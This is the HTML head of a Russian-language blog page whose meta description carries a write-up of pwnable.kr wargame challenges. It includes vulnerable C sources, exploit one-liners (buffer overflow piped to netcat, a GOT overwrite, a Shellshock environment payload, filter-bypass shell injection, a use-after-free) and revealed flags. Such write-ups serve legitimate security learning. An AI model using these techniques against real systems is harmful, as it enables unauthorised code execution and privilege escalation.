<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>pwnable.kr [ru]</title>

  <link rel="stylesheet" href="/css/main.css">
  <!-- <link href="assets/favicon.ico" rel="icon" type="image/x-icon" /> -->
  <link rel="shortcut icon" type="image/png" href="assets//favicon.png">
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>pwnable.kr [ru] | Windows Internals Blog</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="pwnable.kr [ru]" />
<meta name="author" content="truebad0ur" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="fd Mommy! what is a file descriptor in Linux? try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://youtu.be/971eZhMHQQw ssh fd@pwnable.kr -p2222 (pw:guest) fd.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc&lt;2){ printf(&quot;pass argv[1] a number\n&quot;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){ printf(&quot;good job :)\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\n&quot;); return 0; } Хотим получить stdin –&gt; всё просто: 0x1234 - X = 0 –&gt; x = 4660 ./fd 4660 LETMEWIN &gt; good job :) &gt; mommy! I think I know what a file descriptor is!! collision Daddy told me about cool MD5 hash collision today. I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest) col.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc&lt;2){ printf(&quot;usage : %s [passcode]\n&quot;, argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(&quot;passcode length should be 20 bytes\n&quot;); return 0; } if(hashcode == check_password( argv[1] )){ system(&quot;/bin/cat flag&quot;); return 0; } else printf(&quot;wrong passcode.\n&quot;); return 0; } Вводится 20 символов, рабиваем их по 4: AAAA AAAA AAAA AAAA AAAA Суммируем, равенство должно выполняться: 0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 = 0x21DD09EC Подгоняем числа, выходит: 0x6c5cec8 + 0x6c5cec8 + 0x6c5cec8 + 0x6c5cec8 + 0x6c5cecc ./col $(python -c &quot;print(&#39;\xc8\xce\xc5\x06&#39; * 4 + &#39;\xcc\xce\xc5\x06&#39;)&quot;) daddy! I just managed to create a hash collision :) bof Nana told me that buffer overflow is one of the most common software vulnerability. Is that true? Download: http://pwnable.kr/bin/bof Download: http://pwnable.kr/bin/bof.c Running at : nc pwnable.kr 9000 bof.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; void func(int key){ char overflowme[32]; printf(&quot;overflow me : &quot;); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(&quot;/bin/sh&quot;); } else{ printf(&quot;Nah..\n&quot;); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } Нужно перезаписать переменную на 0xcafebabe, находим в дебаггере правильный офсет, засылаем байты, cat’ом не даём stdout закрыться (python -c “print(&#39;A&#39;*52 + &#39;\xbe\xba\xfe\xca&#39;)&quot;; cat) | nc pwnable.kr 9000 daddy, I just pwned a buFFer :) flag Papa brought me a packed present! let’s open it. Download: http://pwnable.kr/bin/flag This is reversing task. all you need is binary strings flag PROT_EXEC|PROT_WRITE failed. $Info: This file is packed with the UPX executable packer http://upx.sf.net $ $Id: UPX 3.08 Copyright © 1996-2011 the UPX Team. All Rights Reserved. $ .\upx.exe -d .\flag UPX…? sounds like a delivery service :) passcode Mommy told me to make a passcode based login system. My initial C code was compiled without any error! Well, there was some compiler warning, but who cares about that? ssh passcode@pwnable.kr -p2222 (pw:guest) passcode.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; void login(){ int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking...\n&quot;); if(passcode1==338150 &amp;amp;&amp;amp; passcode2==13371337){ printf(&quot;Login OK!\n&quot;); system(&quot;/bin/cat flag&quot;); } else{ printf(&quot;Login Failed!\n&quot;); exit(0); } } void welcome(){ char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s!\n&quot;, name); } int main(){ printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :)\n&quot;); return 0; } Отсутствие форматных символов в scanf’ах позволяет передать туда адреса и записать по ним, что нам нужно Где находятся переменные: name: [ebp-0x70] passcode1: [ebp-0x10] passcode2: [ebp-0xc] Но: char name[100]. passcode1 и passcode2 инты, каждый занимает 4 байта Считаем оффсет, passcode1 - name = 0x70 - 0x10 = 0x60 = 96 байт passcode1 занимает последние 4 байта массива name Заполняем массив до конца В последних 4-ёх байтах передаём адрес функции fflush из GOT - 0x0804a004 scanf’ом в функции login перезаписываем адрес fflush в GOT на код, когда уже проверки прошли и функцией system вызывается cat - 0x080485e3 (передаём его в десятичной 134514147) При вызове fflush исполнение перейдёт на нужную нам часть листинга gdb-peda$ x/x 0x0804a004 0x804a004 &lt;fflush@got.plt&gt;: 0x08048436 gdb-peda$ x/x 0x0804a004 0x804a004 &lt;fflush@got.plt&gt;: 0x080485e3 python -c &quot;print &#39;\x01&#39;*96 + &#39;\x04\xa0\x04\x08&#39; + &#39;134514147&#39;&quot; | ./passcode Sorry mom… I got confused about scanf usage :( random Daddy, teach me how to use random value in programming! ssh random@pwnable.kr -p2222 (pw:guest) random.c #include &lt;stdio.h&gt; int main(){ unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(&quot;%d&quot;, &amp;amp;key); if( (key ^ random) == 0xdeadbeef ){ printf(&quot;Good!\n&quot;); system(&quot;/bin/cat flag&quot;); return 0; } printf(&quot;Wrong, maybe you should try 2^32 cases.\n&quot;); return 0; } Не инициализирован сид для рандома (srand) Первое значение рандома в си без инициализации - 0x6b8b4567 key ^ 0x6b8b4567 == 0xdeadbeef –&gt; 0x6b8b4567 ^ 0xdeadbeef == 0xb526fb88 == 3039230856 Передаём в прогу это число 3039230856 random@pwnable:~$ echo -ne &quot;3039230856&quot; | ./random Good! Mommy, I thought libc random is unpredictable… input Mom? how can I pass my input to a computer program? ssh input2@pwnable.kr -p2222 (pw:guest) input.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;sys/socket.h&gt; #include &lt;arpa/inet.h&gt; int main(int argc, char* argv[], char* envp[]){ printf(&quot;Welcome to pwnable.kr\n&quot;); printf(&quot;Let&#39;s see if you know how to give input to program\n&quot;); printf(&quot;Just give me correct inputs then you will get the flag :)\n&quot;); // argv if(argc != 100) return 0; if(strcmp(argv[&#39;A&#39;],&quot;\x00&quot;)) return 0; if(strcmp(argv[&#39;B&#39;],&quot;\x20\x0a\x0d&quot;)) return 0; printf(&quot;Stage 1 clear!\n&quot;); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, &quot;\x00\x0a\x00\xff&quot;, 4)) return 0; read(2, buf, 4); if(memcmp(buf, &quot;\x00\x0a\x02\xff&quot;, 4)) return 0; printf(&quot;Stage 2 clear!\n&quot;); // env if(strcmp(&quot;\xca\xfe\xba\xbe&quot;, getenv(&quot;\xde\xad\xbe\xef&quot;))) return 0; printf(&quot;Stage 3 clear!\n&quot;); // file FILE* fp = fopen(&quot;\x0a&quot;, &quot;r&quot;); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, &quot;\x00\x00\x00\x00&quot;, 4) ) return 0; fclose(fp); printf(&quot;Stage 4 clear!\n&quot;); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1){ printf(&quot;socket error, tell admin\n&quot;); return 0; } saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv[&#39;C&#39;]) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0){ printf(&quot;bind error, use another port\n&quot;); return 1; } listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0){ printf(&quot;accept error, tell admin\n&quot;); return 0; } if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, &quot;\xde\xad\xbe\xef&quot;, 4)) return 0; printf(&quot;Stage 5 clear!\n&quot;); // here&#39;s your flag system(&quot;/bin/cat flag&quot;); return 0; } python2 import subprocess import os import socket import time os.system(&quot;ln -s /home/input2/flag /tmp/tests4/flag&quot;) with open(&quot;/tmp/tests4/\x0a&quot;, &quot;w&quot;) as f: f.write(&quot;\x00\x00\x00\x00&quot;) stdin_r, stdin_w = os.pipe() stderr_r, stderr_w = os.pipe() args = [&#39;X&#39;] * 99 args[64] = &#39;&#39; args[65] = &quot;\x20\x0A\x0D&quot; args[66] = &quot;65005&quot; process = subprocess.Popen([&quot;/home/input2/input&quot;] + args, stdin=stdin_r, stderr=stderr_r, env={&quot;\xDE\xAD\xBE\xEF&quot;: &quot;\xCA\xFE\xBA\xBE&quot;}, cwd=&quot;/tmp/tests4/&quot;) os.write(stdin_w, &quot;\x00\x0A\x00\xFF&quot;) os.write(stderr_w, &quot;\x00\x0A\x02\xFF&quot;) time.sleep(3) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&quot;localhost&quot;, 65005)) s.sendall(&#39;\xDE\xAD\xBE\xEF&#39;) s.close() Mommy! I learned how to pass various input in Linux :) stroobants.dev/pwnablekr-series-input.html leg Daddy told me I should study arm. But I prefer to study my leg! Download: http://pwnable.kr/bin/leg.c Download: http://pwnable.kr/bin/leg.asm ssh leg@pwnable.kr -p2222 (pw:guest) leg.c #include &lt;stdio.h&gt; #include &lt;fcntl.h&gt; int key1(){ asm(&quot;mov r3, pc\n&quot;); } int key2(){ asm( &quot;push {r6}\n&quot; &quot;add r6, pc, $1\n&quot; &quot;bx r6\n&quot; &quot;.code 16\n&quot; &quot;mov r3, pc\n&quot; &quot;add r3, $0x4\n&quot; &quot;push {r3}\n&quot; &quot;pop {pc}\n&quot; &quot;.code 32\n&quot; &quot;pop {r6}\n&quot; ); } int key3(){ asm(&quot;mov r3, lr\n&quot;); } int main(){ int key=0; printf(&quot;Daddy has very strong arm! : &quot;); scanf(&quot;%d&quot;, &amp;key); if( (key1()+key2()+key3()) == key ){ printf(&quot;Congratz!\n&quot;); int fd = open(&quot;flag&quot;, O_RDONLY); char buf[100]; int r = read(fd, buf, 100); write(0, buf, r); } else{ printf(&quot;I have strong leg :P\n&quot;); } return 0; } leg.asm (gdb) disass main Dump of assembler code for function main: 0x00008d3c &lt;+0&gt;: push {r4, r11, lr} 0x00008d40 &lt;+4&gt;: add r11, sp, #8 0x00008d44 &lt;+8&gt;: sub sp, sp, #12 0x00008d48 &lt;+12&gt;: mov r3, #0 0x00008d4c &lt;+16&gt;: str r3, [r11, #-16] 0x00008d50 &lt;+20&gt;: ldr r0, [pc, #104] ; 0x8dc0 &lt;main+132&gt; 0x00008d54 &lt;+24&gt;: bl 0xfb6c &lt;printf&gt; 0x00008d58 &lt;+28&gt;: sub r3, r11, #16 0x00008d5c &lt;+32&gt;: ldr r0, [pc, #96] ; 0x8dc4 &lt;main+136&gt; 0x00008d60 &lt;+36&gt;: mov r1, r3 0x00008d64 &lt;+40&gt;: bl 0xfbd8 &lt;__isoc99_scanf&gt; 0x00008d68 &lt;+44&gt;: bl 0x8cd4 &lt;key1&gt; 0x00008d6c &lt;+48&gt;: mov r4, r0 0x00008d70 &lt;+52&gt;: bl 0x8cf0 &lt;key2&gt; 0x00008d74 &lt;+56&gt;: mov r3, r0 0x00008d78 &lt;+60&gt;: add r4, r4, r3 0x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt; 0x00008d80 &lt;+68&gt;: mov r3, r0 0x00008d84 &lt;+72&gt;: add r2, r4, r3 0x00008d88 &lt;+76&gt;: ldr r3, [r11, #-16] 0x00008d8c &lt;+80&gt;: cmp r2, r3 0x00008d90 &lt;+84&gt;: bne 0x8da8 &lt;main+108&gt; 0x00008d94 &lt;+88&gt;: ldr r0, [pc, #44] ; 0x8dc8 &lt;main+140&gt; 0x00008d98 &lt;+92&gt;: bl 0x1050c &lt;puts&gt; 0x00008d9c &lt;+96&gt;: ldr r0, [pc, #40] ; 0x8dcc &lt;main+144&gt; 0x00008da0 &lt;+100&gt;: bl 0xf89c &lt;system&gt; 0x00008da4 &lt;+104&gt;: b 0x8db0 &lt;main+116&gt; 0x00008da8 &lt;+108&gt;: ldr r0, [pc, #32] ; 0x8dd0 &lt;main+148&gt; 0x00008dac &lt;+112&gt;: bl 0x1050c &lt;puts&gt; 0x00008db0 &lt;+116&gt;: mov r3, #0 0x00008db4 &lt;+120&gt;: mov r0, r3 0x00008db8 &lt;+124&gt;: sub sp, r11, #8 0x00008dbc &lt;+128&gt;: pop {r4, r11, pc} 0x00008dc0 &lt;+132&gt;: andeq r10, r6, r12, lsl #9 0x00008dc4 &lt;+136&gt;: andeq r10, r6, r12, lsr #9 0x00008dc8 &lt;+140&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4b0 0x00008dcc &lt;+144&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4bc 0x00008dd0 &lt;+148&gt;: andeq r10, r6, r4, asr #9 End of assembler dump. (gdb) disass key1 Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lr End of assembler dump. (gdb) disass key2 Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push {r6} ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push {r3} 0x00008d0a &lt;+26&gt;: pop {pc} 0x00008d0c &lt;+28&gt;: pop {r6} ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lr End of assembler dump. (gdb) disass key3 Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lr End of assembler dump. (gdb) hex(0x8ce4 + 0x8d0c + 0x8d80) &gt; Out[33]: &#39;0x1a770&#39; / $ ./leg Daddy has very strong arm! : 108400 Congratz! My daddy has a lot of ARMv5te muscle! mistake We all make mistakes, let’s move on. don’t take this too seriously, no fancy hacking skill is required at all) This task is based on real event Thanks to dhmonkey hint : operator priority ssh mistake@pwnable.kr -p2222 (pw:guest) mistake.c #include &lt;stdio.h&gt; #include &lt;fcntl.h&gt; #define PW_LEN 10 #define XORKEY 1 void xor(char* s, int len){ int i; for(i=0; i&lt;len; i++){ s[i] ^= XORKEY; } } int main(int argc, char* argv[]){ int fd; if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0){ printf(&quot;can&#39;t open password %d\n&quot;, fd); return 0; } printf(&quot;do not bruteforce...\n&quot;); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0)){ printf(&quot;read error\n&quot;); close(fd); return 0; } char pw_buf2[PW_LEN+1]; printf(&quot;input password : &quot;); scanf(&quot;%10s&quot;, pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN)){ printf(&quot;Password OK\n&quot;); system(&quot;/bin/cat flag\n&quot;); } else{ printf(&quot;Wrong Password\n&quot;); } close(fd); return 0; } В fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0 сначала выполняется правая часть, а в самом конце = (fd = (1 &lt; 0)) --&gt; false Поэтому по итогу в fd, из которого по идее мы читаем(где должен быть дескриптор файла password), лежит 0, читаем из stdin’а mistake@pwnable:~$ ./mistake do not bruteforce… @@@@@CCCCC input password : AAAAABBBBB Password OK Mommy, the operator priority always confuses me :( shellshock Mommy, there was a shocking news about bash. I bet you already know, but lets just make it sure :) ssh shellshock@pwnable.kr -p2222 (pw:guest) shellshock.c #include &lt;stdio.h&gt; int main(){ setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system(&quot;/home/shellshock/bash -c &#39;echo shock_me&#39;&quot;); return 0; } env x=&#39;() { :;}; /bin/cat flag&#39; ./shellshock only if I knew CVE-2014-6271 ten years ago…!! coin1 Mommy, I wanna play a game! (if your network response time is too slow, try nc 0 9007 inside pwnable.kr server) Running at : nc pwnable.kr 9007 --------------------------------------------------- - Shall we play a game? - --------------------------------------------------- You have given some gold coins in your hand however, there is one counterfeit coin among them counterfeit coin looks exactly same as real coin however, its weight is different from real one real coin weighs 10, counterfeit coin weighes 9 help me to find the counterfeit coin with a scale if you find 100 counterfeit coins, you will get reward :) FYI, you have 60 seconds. - How to play - 1. you get a number of coins (N) and number of chances (C) 2. then you specify a set of index numbers of coins to be weighed 3. you get the weight information 4. 2~3 repeats C time, then you give the answer - Example - [Server] N=4 C=2 # find counterfeit among 4 coins with 2 trial [Client] 0 1 # weigh first and second coin [Server] 20 # scale result : 20 [Client] 3 # weigh fourth coin [Server] 10 # scale result : 10 [Client] 2 # counterfeit coin is third! [Server] Correct! - Ready? starting in 3 sec... - Бинарная сиртировка тупа Ну чё, посортируем from pwn import * # For SSHing in, and then running locally # s = ssh(host=&quot;pwnable.kr&quot;, user=&quot;fd&quot;, port=2222, password=&quot;guest&quot;) # conn = s.remote(&#39;localhost&#39;, 9007) # For running remotely #conn = remote(&#39;pwnable.kr&#39;, 9007) # For running locally on pwnable.kr # Всё оч медленно, поэтому, кроме как подконнектиться и запустить локально, вариков нет conn = remote(&#39;localhost&#39;, 9007) conn.recvuntil(&#39;Ready? starting in 3 sec&#39;) conn.recvline() conn.recvline() for _ in range(100): line = conn.recvline().decode(&#39;utf-8&#39;).strip().split(&#39; &#39;) # [u&#39;N=317&#39;, u&#39;C=9&#39;] # print line n = int(line[0].split(&#39;=&#39;)[1]) # 317 c = int(line[1].split(&#39;=&#39;)[1]) # 9 start = 0 end = n - 1 for _ in range(c): mid = int((start + end)/2) # cast to ensure only whole numbers # print(&#39;start: &#39;+str(start)) # print(&#39;mid: &#39;+str(mid)) # print(&#39;end: &#39;+str(end)) guess = &#39; &#39;.join(str(i) for i in range(start, mid + 1)) # print guess conn.sendline(guess) weight = int(conn.recvline()) # print weight if weight % 10 == 0: # if divisible by 10, then no counterfeit in list start = mid + 1 else: # counterfeit in list end = mid conn.sendline(str(start)) # send final guess print(conn.recvline()) # Correct! (n) print(conn.recvline()) # Congrats! get your flag print(conn.recvline()) # {actual flag} conn.close() b1NaRy_S34rch1nG_1s_3asy_p3asy код отсюда blackjack Hey! check out this C implementation of blackjack game! I found it online http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html I like to give my flags to millionares. how much money you got? Running at : nc pwnable.kr 9009 Видим код и реализацию betting int betting() //Asks user amount to bet { printf(&quot;\n\nEnter Bet: $&quot;); scanf(&quot;%d&quot;, &amp;bet); if (bet &gt; cash) //If player tries to bet more money than player has { printf(&quot;\nYou cannot bet more money than you have.&quot;); printf(&quot;\nEnter Bet: &quot;); scanf(&quot;%d&quot;, &amp;bet); return bet; } else return bet; Всего лишь два прохода, на втором нет проверки bet &gt; cash 2 варианта: 1) Ввести сначала чисто больше 500 –&gt; попадаем в if 2) Вводим число очень большое 2147483047 3) Выигрываем в партии –&gt; профит 1) Вводим отрицательное число –&gt; - - = + 2) Проигрываем YaY_I_AM_A_MILLIONARE_LOL lotto Mommy! I made a lotto program for my homework. do you want to play? ssh lotto@pwnable.kr -p2222 (pw:guest) #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;fcntl.h&gt; unsigned char submit[6]; void play(){ int i; printf(&quot;Submit your 6 lotto bytes : &quot;); fflush(stdout); int r; r = read(0, submit, 6); printf(&quot;Lotto Start!\n&quot;); //sleep(1); // generate lotto numbers int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); if(fd==-1){ printf(&quot;error. tell admin\n&quot;); exit(-1); } unsigned char lotto[6]; if(read(fd, lotto, 6) != 6){ printf(&quot;error2. tell admin\n&quot;); exit(-1); } for(i=0; i&lt;6; i++){ lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 } close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i&lt;6; i++){ for(j=0; j&lt;6; j++){ if(lotto[i] == submit[j]){ match++; } } } // win! if(match == 6){ system(&quot;/bin/cat flag&quot;); } else{ printf(&quot;bad luck...\n&quot;); } } void help(){ printf(&quot;- nLotto Rule -\n&quot;); printf(&quot;nlotto is consisted with 6 random natural numbers less than 46\n&quot;); printf(&quot;your goal is to match lotto numbers as many as you can\n&quot;); printf(&quot;if you win lottery for *1st place*, you will get reward\n&quot;); printf(&quot;for more details, follow the link below\n&quot;); printf(&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;); printf(&quot;mathematical chance to win this game is known to be 1/8145060.\n&quot;); } int main(int argc, char* argv[]){ // menu unsigned int menu; while(1){ printf(&quot;- Select Menu -\n&quot;); printf(&quot;1. Play Lotto\n&quot;); printf(&quot;2. Help\n&quot;); printf(&quot;3. Exit\n&quot;); scanf(&quot;%d&quot;, &amp;menu); switch(menu){ case 1: play(); break; case 2: help(); break; case 3: printf(&quot;bye\n&quot;); return 0; default: printf(&quot;invalid menu\n&quot;); break; } } return 0; } Проверяется один байт рандома с 6-ью байтами инпута, занчит все байты инпута должны быть одинаковыми, пишем скрипт и надеемся на рандом! Диапазон от 1 до 45 from pwn import * sh = ssh(&#39;lotto&#39;, &#39;pwnable.kr&#39;, password=&#39;guest&#39;, port=2222) p = sh.process(&#39;./lotto&#39;) for i in range(1000): p.recv() p.sendline(&#39;1&#39;) p.recv() p.sendline(&#39;------&#39;) _ , ans = p.recvlines(2) if &quot;bad&quot; not in ans: print(ans) break sorry mom… I FORGOT to check duplicate numbers… :( cmd1 Mommy! what is PATH environment in Linux? ssh cmd1@pwnable.kr -p2222 (pw:guest) cmd1.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; int filter(char* cmd){ int r=0; r += strstr(cmd, &quot;flag&quot;)!=0; r += strstr(cmd, &quot;sh&quot;)!=0; r += strstr(cmd, &quot;tmp&quot;)!=0; return r; } int main(int argc, char* argv[], char** envp){ putenv(&quot;PATH=/thankyouverymuch&quot;); if(filter(argv[1])) return 0; system( argv[1] ); return 0; } Notice the difference between single quotes and double quotes in argv: $ ./test &#39;$(echo abc)&#39; argv[1] = $(echo abc) $ ./test &quot;$(echo abc)&quot; argv[1] = abc Single quotes pass the command without executing it. Double quotes executes the command then passes its output (cannot pass the filter). ./cmd1 &#39;$(printf &quot;/bin/%s%s&quot; &quot;s&quot; &quot;h&quot;)&#39; /bin/cat /home/cmd1/flag mommy now I get what PATH environment is for :) cmd2 Daddy bought me a system command shell. but he put some filters to prevent me from playing with it without his permission… but I wanna play anytime I want! ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1) #include &lt;stdio.h&gt; #include &lt;string.h&gt; int filter(char* cmd){ int r=0; r += strstr(cmd, &quot;=&quot;)!=0; r += strstr(cmd, &quot;PATH&quot;)!=0; r += strstr(cmd, &quot;export&quot;)!=0; r += strstr(cmd, &quot;/&quot;)!=0; r += strstr(cmd, &quot;`&quot;)!=0; r += strstr(cmd, &quot;flag&quot;)!=0; return r; } extern char** environ; void delete_env(){ char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p)); } int main(int argc, char* argv[], char** envp){ delete_env(); putenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;); if(filter(argv[1])) return 0; printf(&quot;%s\n&quot;, argv[1]); system( argv[1] ); return 0; } ./cmd2 &#39;$(printf &quot;%bbin%bbash -p&quot; &quot;\57&quot; &quot;\57&quot;)&#39; (и гениальное) ./cmd2 &#39;$(read x; echo $x)&#39; FuN_w1th_5h3ll_v4riabl3s_haha uaf Mommy, what is Use After Free bug? ssh uaf@pwnable.kr -p2222 (pw:guest) #include &lt;fcntl.h&gt; #include &lt;iostream&gt; #include &lt;cstring&gt; #include &lt;cstdlib&gt; #include &lt;unistd.h&gt; using namespace std; class Human{ private: virtual void give_shell(){ system(&quot;/bin/sh&quot;); } protected: int age; string name; public: virtual void introduce(){ cout &lt; &quot;My name is &quot; &lt; name &lt; endl; cout &lt; &quot;I am &quot; &lt; age &lt; &quot; years old&quot; &lt; endl; } }; class Man: public Human{ public: Man(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt; &quot;I am a nice guy!&quot; &lt; endl; } }; class Woman: public Human{ public: Woman(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt; &quot;I am a cute girl!&quot; &lt; endl; } }; int main(int argc, char* argv[]){ Human* m = new Man(&quot;Jack&quot;, 25); Human* w = new Woman(&quot;Jill&quot;, 21); size_t len; char* data; unsigned int op; while(1){ cout &lt; &quot;1. use\n2. after\n3. free\n&quot;; cin &gt; op; switch(op){ case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt; &quot;your data is allocated&quot; &lt; endl; break; case 3: delete m; delete w; break; default: break; } } return 0; } python -c &#39;print (&quot;\x68\x15\x40\x00\x00\x00\x00\x00&quot;)&#39; &gt; /tmp/ihcuaf ./uaf 24 /tmp/ihcuaf 3 2 2 1 cat flag yay_f1ag_aft3r_pwning https://gist.github.com/ihciah/3c157f18f49bd2287470 https://medium.com/@c0ngwang/pwnable-kr-writeup-uaf-4cb8ba851472 memcpy asm unlink blukat horcruxes" />
<meta property="og:description" content="fd Mommy! what is a file descriptor in Linux? try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://youtu.be/971eZhMHQQw ssh fd@pwnable.kr -p2222 (pw:guest) fd.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc&lt;2){ printf(&quot;pass argv[1] a number\n&quot;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){ printf(&quot;good job :)\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\n&quot;); return 0; } Хотим получить stdin –&gt; всё просто: 0x1234 - X = 0 –&gt; x = 4660 ./fd 4660 LETMEWIN &gt; good job :) &gt; mommy! I think I know what a file descriptor is!! collision Daddy told me about cool MD5 hash collision today. I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest) col.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc&lt;2){ printf(&quot;usage : %s [passcode]\n&quot;, argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(&quot;passcode length should be 20 bytes\n&quot;); return 0; } if(hashcode == check_password( argv[1] )){ system(&quot;/bin/cat flag&quot;); return 0; } else printf(&quot;wrong passcode.\n&quot;); return 0; } Вводится 20 символов, рабиваем их по 4: AAAA AAAA AAAA AAAA AAAA Суммируем, равенство должно выполняться: 0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 = 0x21DD09EC Подгоняем числа, выходит: 0x6c5cec8 + 0x6c5cec8 + 0x6c5cec8 + 0x6c5cec8 + 0x6c5cecc ./col $(python -c &quot;print(&#39;\xc8\xce\xc5\x06&#39; * 4 + &#39;\xcc\xce\xc5\x06&#39;)&quot;) daddy! I just managed to create a hash collision :) bof Nana told me that buffer overflow is one of the most common software vulnerability. Is that true? Download: 